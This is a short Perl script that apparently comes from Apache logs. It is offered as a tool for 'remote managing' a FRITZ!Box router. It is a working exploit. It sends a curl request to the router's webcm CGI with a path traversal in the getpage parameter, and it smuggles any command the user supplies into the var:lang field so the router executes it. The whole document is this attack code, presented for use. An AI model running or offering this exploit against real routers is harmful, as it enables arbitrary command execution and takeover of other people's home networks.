#!/usr/bin/perl
# Small script I "found" in some apache logfiles. Useful for fritzbox remote "managing".

use strict;
use warnings;

unless ( $ARGV[0] ) {
    print STDERR "Please give a command to execute on your fritz.box.\n";
} else {
    system("curl -s  \"http://fritz.box/cgi-bin/webcm?getpage=../html/menus/menu2.html&var:lang=%26%20" . $ARGV[0] . "%20%26\"");
}

